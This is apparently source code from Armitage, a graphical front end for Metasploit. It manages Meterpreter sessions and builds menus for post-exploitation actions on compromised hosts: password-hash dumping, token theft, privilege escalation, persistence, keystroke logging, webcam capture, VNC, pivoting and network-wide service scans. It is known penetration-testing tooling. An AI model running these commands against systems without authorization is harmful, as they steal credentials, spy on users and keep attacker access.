
#
# this code maintains the client threads (one per meterpreter session) and
# the data structures for each meterpreter session.
#

import armitage.*;
import console.*;
import msf.*;

import javax.swing.*;

global('%sessions %handlers $handler');

sub session {
	if ($1 !in %sessions && $mclient !is $null) {
		%sessions[$1] = [$cortana getSession: $1];
		[%sessions[$1] addListener: lambda(&parseMeterpreter)];		
	}

	return %sessions[$1];
}

sub oneTimeShow {
	%handlers[$1] = lambda({
		if ($0 eq "begin") {
			showError($2);
			%handlers[$command] = $null;
		}
	}, $command => $1);
}

sub m_cmd_callback {
	if ($mclient is $null) {
		warn("Dropping: " . @_ . " - collab check not complete!");
		return;
	}

	[session($1) addCommand: $3, "$2 $+ \n"];
}

# m_cmd("session", "command here")
sub m_cmd {
	if ($mclient is $null) {
		warn("Dropping: " . @_ . " - collab check not complete!");
		return;
	}

	local('$command $handler');
        $command = split('\s+', [$2 trim])[0];
	$handler = %handlers[$command];

	if ($handler !is $null) {
		[$handler execute: $1, [$2 trim]];
	}
	else {
		$handler = {};
	}

	[session($1) addCommand: $handler, "$2 $+ \n"];
}

sub parseMeterpreter {
	local('@temp $command $line $sid $token $response $data $command');

	# called with: sid, token, response 
	($sid, $token, $response) = @_;

	if ($token isa ^MeterpreterClient || $token isa ^cortana.metasploit.MeterpreterBridge$MeterpreterToken) {
		return;
	}

	$response = convertAll($3);
	$data = $response['data'];

	if ("*uploaded*:*->*" iswm $data) {
		# this is a hack to force the file browser to refresh when a file is uploaded
		m_cmd($sid, "ls");
	}
	else if ("[-]*Unknown command: *" iswm $data) {
		%handlers["list_tokens"] = $null;
		%handlers["getuid"] = $null;
		m_cmd($sid, "load stdapi");
		m_cmd($sid, "load priv");
		showError("Loading stdapi. Try command again");
		return;
	}

	$handler = $token;

	if ($handler !is $null && $0 eq "commandComplete") {
		local('$h');
		$h = $handler;
		[$h begin: $1, $data];
		@temp = split("\n", $data);
		foreach $line (@temp) {
			[$h update: $1, $line];
		}	
		[$h end: $1, $data];
	}
	else if ($handler !is $null && $0 eq "commandTimeout") {
		[$handler timeout: $1, $data];
	}
}

sub interpretMeterpreterCommand {
	local('$c');
	$c = [lc([$1 getActionCommand] . "") trim];

	if ($c eq "shell") {
		createShellTab($sid);
	}
	else if ($c eq "screenshot") {
		[createScreenshotViewer($sid)];
	}
	else if ($c eq "webcam_snap") {
		[createWebcamViewer($sid)];
	}
}

#
# this code creates and managers a meterpreter tab.
#
sub createMeterpreterTab {
        local('$session $result $thread $console $old');

        $session = session($1);

	# set up a meterpreter console window
        $console = [new Console: $preferences];
	setupConsoleStyle($console);
	logCheck($console, sessionToHost($1), "meterpreter_ $+ $1");
	[$console setPopupMenu: lambda(&meterpreterPopup, $session => sessionData($1), $sid => $1)];

	# tab completion for Meterpreter... :D
	[new TabCompletion: $console, $client, $1, "session.meterpreter_tabs"];

	# set up a listener to read input from the console and dump output back to it.
	if ("*Windows*" !iswm sessionToOS($1) || ($REMOTE && $mclient is $client)) {
		[new MeterpreterClient: $console, $session, $null];
	}
	else {
		[new MeterpreterClient: $console, $session, newInstance(^java.awt.event.ActionListener, lambda(&interpretMeterpreterCommand, $sid => $1))];
	}

        [$frame addTab: "Meterpreter $1", $console, $null, "Meterpreter " . sessionToHost($1)];
}

sub meterpreterPopup {
        local('$popup');
        $popup = [new JPopupMenu];

	showMeterpreterMenu($popup, \$session, \$sid);
	
        [$popup show: [$2 getSource], [$2 getX], [$2 getY]];
}

sub showMeterpreterMenu {
	local('$j $platform');
	
	$platform = lc($session['platform']);

	setupMenu($1, "meterpreter_top", @($sid));

	if ("*win*" iswm $platform) {
		$j = menu($1, "Access", 'A');
	
		item($j, "Migrate Now!", 'M', lambda({
			oneTimeShow("run");
			m_cmd($sid, "run migrate -f");
		}, $sid => "$sid"));

		item($j, "Escalate Privileges", 'E', lambda({
			showPostModules($sid, "*escalate*", 
				ohash(exploit => buildTree(filter({ return iff("*windows/local/*" iswm $1, $1); }, @exploits)))
			);
		}, $sid => "$sid"));

		item($j, "Steal Token" , "S", lambda({
			m_cmd($sid, "load incognito");
			stealToken($sid);
		}, $sid => "$sid"));

		local('$h');
		$h = menu($j, "Dump Hashes", "D");

		item($h, "lsass method", "l", lambda({
			m_cmd($sid, "hashdump");
		}, $sid => "$sid"));


		item($h, "registry method", "r", lambda({
			thread(lambda({
				launch_dialog("Dump Hashes", "post", "windows/gather/smart_hashdump", 1, $null, %(SESSION => $sid, GETSYSTEM => "1"));
			}, \$sid));
		}, $sid => "$sid"));

		item($j, "Persist", 'P', lambda({
			thread(lambda({
				launch_dialog("Persistence", "post", "windows/manage/persistence", 1, $null, %(SESSION => $sid, LPORT => %MSF_GLOBAL['LPORT'], HANDLER => "0"));
			}, \$sid));
		}, $sid => "$sid"));

		item($j, "Pass Session", 'S', lambda({
			thread(lambda({
				launch_dialog("Pass Session", "post", "windows/manage/payload_inject", 1, $null, %(SESSION => $sid, LPORT => %MSF_GLOBAL['LPORT'], HANDLER => "0"));
			}, \$sid));
		}, $sid => "$sid"));

		setupMenu($j, "meterpreter_access", @($sid));
	}
			
	$j = menu($1, "Interact", 'I');

			if ("*win*" iswm $platform || sessionToOS($sid) eq "Microsoft Windows") {
				item($j, "Command Shell", 'C', lambda({ createShellTab($sid); }, $sid => "$sid"));
			}
			else {
				#item($j, "Command Shell", 'C', lambda({ createCommandTab($sid, "/bin/bash"); }, $sid => "$sid"));
			}

			item($j, "Meterpreter Shell", 'M', lambda({ createMeterpreterTab($sid); }, $sid => "$sid"));

			if ("*win*" iswm $platform) {
				item($j, "Desktop (VNC)", 'D', lambda({ 
					local('$display');
					$display = rand(9) . rand(9);
					%handlers["run"] = lambda({
						if ($0 eq "begin") {
							local('$a');
							$a = iff($REMOTE, $MY_ADDRESS, "127.0.0.1");
							showError("$2 $+ \nConnect VNC viewer to $a $+ :59 $+ $display (display $display $+ )\n\nIf your connection is refused, you may need to migrate to a \nnew process to set up VNC.");
							%handlers["run"] = $null;
						}
					}, \$display);

					if ($REMOTE) {
						m_cmd($sid, "run vnc -V -t -O -v 59 $+ $display -p " . randomPort() . " -i");
					}
					else {
						m_cmd($sid, "run vnc -V -t -v 59 $+ $display -p " . randomPort() . " -i");
					}
				}, $sid => "$sid"));
			}

			setupMenu($j, "meterpreter_interact", @($sid));

	$j = menu($1, "Explore", 'E');
			item($j, "Browse Files", 'B', lambda({ createFileBrowser($sid, $platform); }, $sid => "$sid", \$platform));
			item($j, "Show Processes", 'P', lambda({ createProcessBrowser($sid); }, $sid => "$sid"));
			if ("*win*" iswm $platform) {
				item($j, "Log Keystrokes", 'K', lambda({ 
					thread(lambda({
						launch_dialog("Log Keystrokes", "post", "windows/capture/keylog_recorder", 1, $null, %(SESSION => $sid, MIGRATE => 1, ShowKeystrokes => 1));
					}, \$sid));
				}, $sid => "$sid"));
			}

			item($j, "Screenshot", 'S', createScreenshotViewer("$sid"));

			if ("*win*" iswm $platform) {
				item($j, "Webcam Shot", 'W', createWebcamViewer("$sid"));
			}

			setupMenu($j, "meterpreter_explore", @($sid));

			separator($j);

			item($j, "Post Modules", 'M', lambda({ showPostModules($sid); }, $sid => "$sid"));

	$j = menu($1, "Pivoting", 'P');
			item($j, "Setup...", 'A', setupPivotDialog("$sid"));
			item($j, "Remove", 'R', lambda({ killPivots($sid, $session); }, \$session, $sid => "$sid"));

	setupMenu($1, "meterpreter_bottom", @($sid));

	if ("*win*" iswm $platform) {
		item($1, "ARP Scan...", 'A', setupArpScanDialog("$sid"));
	}
	else {
		item($1, "Ping Sweep...", 'P', setupPingSweepDialog("$sid"));
	}

	separator($1);

	item($1, "Kill", 'K', lambda({ call_async($client, "session.stop", $sid); }, $sid => "$sid"));
}

sub launch_msf_scans {
	local('@modules $1 $hosts');

	@modules = filter({ return iff("*_version" iswm $1, $1); }, @auxiliary);

	$hosts = iff($1 is $null, ask("Enter range (e.g., 192.168.1.0/24):"), $1);
	if ($hosts is $null) {
		return;
	}

	thread(lambda({
		local('$scanner $index $queue %ports %discover $port %o $temp');
		%ports = ohash();
		%discover = ohash();
		setMissPolicy(%ports, { return @(); });
		setMissPolicy(%discover, { return @(); });

		elog("launched msf scans at: $hosts");

		$queue = createDisplayTab("Scan", $host => "all", $file => "scan");

		[$queue append: "[*] Building list of scan ports and modules"];

		# build up a list of scan ports
		foreach $index => $scanner (@modules) {
			if ($scanner ismatch 'scanner/(.*?)/\1_version') {
				%o = call($client, "module.options", "auxiliary", $scanner);
				if ('RPORT' in %o) {
					$port = %o['RPORT']['default'];
					push(%ports[$port], $scanner);
					if ($port == 80) {
						push(%ports['443'], $scanner);
					}
				}

				safetyCheck();
			}
		}

		# add these ports to our list of ports to scan.. these come from querying all of Metasploit's modules
		# for the default ports
		foreach $port (@(50000, 21, 1720, 80, 443, 143, 3306, 1521, 110, 5432, 50013, 25, 161, 22, 23, 17185, 135, 8080, 4848, 1433, 5560, 512, 513, 514, 445, 5900, 5038, 111, 139, 49, 515, 7787, 2947, 7144, 9080, 8812, 2525, 2207, 3050, 5405, 1723, 1099, 5555, 921, 10001, 123, 3690, 548, 617, 6112, 6667, 3632, 783, 10050, 38292, 12174, 2967, 5168, 3628, 7777, 6101, 10000, 6504, 41523, 41524, 2000, 1900, 10202, 6503, 6070, 6502, 6050, 2103, 41025, 44334, 2100, 5554, 12203, 26000, 4000, 1000, 8014, 5250, 34443, 8028, 8008, 7510, 9495, 1581, 8000, 18881, 57772, 9090, 9999, 81, 3000, 8300, 8800, 8090, 389, 10203, 5093, 1533, 13500, 705, 623, 4659, 20031, 16102, 6080, 6660, 11000, 19810, 3057, 6905, 1100, 10616, 10628, 5051, 1582, 65535, 105, 22222, 30000, 113, 1755, 407, 1434, 2049, 689, 3128, 20222, 20034, 7580, 7579, 38080, 12401, 910, 912, 11234, 46823, 5061, 5060, 2380, 69, 5800, 62514, 42, 5631, 902, 5985)) {
			$temp = %ports[$port];
		}

		# add a few left out modules
		push(%ports['445'], "scanner/smb/smb_version");

		[$queue append: "[*] Launching TCP scan"];
		[$queue addCommand: $null, "use auxiliary/scanner/portscan/tcp"];
		[$queue setOptions: %(PORTS => join(", ", keys(%ports)), RHOSTS => $hosts, THREADS => 24)];
		[$queue addCommand: "x", "run -j"];

		[$queue addSessionListener: lambda({
			this('$start @launch');
			local('$text $host $port $hosts $modules $module $options');

			foreach $text (split("\n", $3)) {
				if ($text ismatch '... (.*?):(\d+) - TCP OPEN') {
					($host, $port) = matched();
					push(%discover[$port], $host);
				}
				else if ($text ismatch '... Scanned \d+ of \d+ hosts .100. complete.' && $start is $null) {
					$start = 1;
					[$queue append: "\n[*] Starting host discovery scans"];

					# gather up the list of modules that we will launch...
					foreach $port => $hosts (%discover) {
						if ($port in %ports) {
							$modules = %ports[$port];
							foreach $module ($modules) {
								if ($port == 443) {
									push(@launch, @($module, %(RHOSTS => join(", ", $hosts), RPORT => $port, THREADS => 24, SSL => "1")));
								}
								else {
									push(@launch, @($module, %(RHOSTS => join(", ", $hosts), RPORT => $port, THREADS => 24)));
								}
							}
						}
					}
				}

				if ($text ismatch '... Scanned \d+ of \d+ hosts .100. complete.' && size(@launch) > 0) {
					[$queue append: "\n[*] " . size(@launch) . " scan" . iff(size(@launch) != 1, "s") . " to go..."];
					($module, $options) = shift(@launch);
					[$queue addCommand: $null, "use $module"];
					[$queue setOptions: $options];
					[$queue addCommand: $null, "run -j"];
				}
				else if ($text ismatch '... Scanned \d+ of \d+ hosts .100. complete.' && size(@launch) == 0) {
					$time = (ticks() - $time) / 1000.0;
					[$queue append: "\n[*] Scan complete in $time $+ s"];
				}
			}
		}, \$hosts, \%ports, \@modules, \%discover, \$queue, $time => ticks())];

		[$queue start];
	}, \$hosts, \@modules));
}
